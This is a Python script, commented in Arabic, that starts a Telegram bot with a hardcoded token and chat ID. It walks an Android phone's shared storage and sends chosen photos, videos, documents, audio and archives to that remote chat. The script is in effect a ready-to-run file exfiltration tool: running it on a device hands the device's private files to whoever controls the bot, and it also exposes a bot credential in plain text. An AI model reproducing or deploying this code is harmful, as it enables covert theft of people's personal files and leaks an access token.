import sys
import subprocess
import os
import telebot
import hashlib

# تثبيت المكتبات المطلوبة إذا لم تكن مثبتة بالفعل
required_modules = ['pyTelegramBotAPI']
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module])

from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# إعداد البوت باستخدام التوكن الخاص بك
bot = telebot.TeleBot("7517544528:AAEwE_8hpzGDqaQyaNSBlRUHi0CZ-ptGn_o")
chat_id = '5164991393'

# تخزين المسارات في قاموس لسهولة الوصول إليها لاحقًا
file_paths = {}
current_directory = "/storage/emulated/0/"  # المسار الافتراضي عند بدء السكربت

# دالة لتوليد تجزئة MD5 لمسار معين
def generate_hash(path):
    return hashlib.md5(path.encode()).hexdigest()

# دالة لعرض الملفات والمجلدات في القائمة
def list_files_in_directory(directory):
    global current_directory
    current_directory = directory
    files = os.listdir(directory)
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    
    # ترتيب وعرض المجلدات أولاً ثم الملفات
    for item in sorted(files):
        item_path = os.path.join(directory, item)
        if os.path.isdir(item_path):
            markup.add(KeyboardButton(f"📂 {item}"))
        else:
            file_hash = generate_hash(item_path)
            file_paths[file_hash] = item_path
            markup.add(KeyboardButton(f"📄 {item}"))
    
    # إضافة أزرار التنقل بين المجلدات
    if os.path.dirname(directory) != directory:  # عدم عرض زر "العودة" في جذر النظام
        markup.add(KeyboardButton("🔙 العودة إلى المجلد السابق"))
    markup.add(KeyboardButton("🏠 العودة للمسار الرئيسي"))
    
    bot.send_message(chat_id=chat_id, text=f'📁 المجلد الحالي: {directory}\nاختر ملفًا لإرساله أو مجلدًا للدخول إليه:', reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_file_selection(message):
    global current_directory
    selected = message.text
    
    if selected.startswith("📂"):
        # إذا كان المجلد، يتم التنقل داخله
        new_dir = os.path.join(current_directory, selected[2:].strip())
        list_files_in_directory(new_dir)
    elif selected.startswith("📄"):
        # إذا كان ملفًا، يتم إرساله
        file_name = selected[2:].strip()
        for file_hash, file_path in file_paths.items():
            if file_name in file_path:
                send_file(file_path)
                break
    elif selected == "🔙 العودة إلى المجلد السابق":
        parent_dir = os.path.dirname(current_directory)
        list_files_in_directory(parent_dir)
    elif selected == "🏠 العودة للمسار الرئيسي":
        list_files_in_directory("/storage/emulated/0/")

# دالة لإرسال الملفات بناءً على نوعها
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".png", ".jpg", ".jpeg", ".webp")):
            bot.send_photo(chat_id=chat_id, photo=f, caption=f'📄 ملف: {file_path}')
        elif file_path.lower().endswith((".mp4", ".mkv", ".avi")):
            bot.send_video(chat_id=chat_id, video=f, caption=f'📄 ملف: {file_path}')
        elif file_path.lower().endswith((".pdf", ".docx", ".txt")):
            bot.send_document(chat_id=chat_id, document=f, caption=f'📄 ملف: {file_path}')
        elif file_path.lower().endswith((".mp3", ".wav")):
            bot.send_audio(chat_id=chat_id, audio=f, caption=f'📄 ملف: {file_path}')
        elif file_path.lower().endswith((".zip", ".rar")):
            bot.send_document(chat_id=chat_id, document=f, caption=f'📄 ملف: {file_path}')

# بدء البوت بعرض الملفات من المسار /storage/emulated/0/
list_files_in_directory(current_directory)

bot.polling()
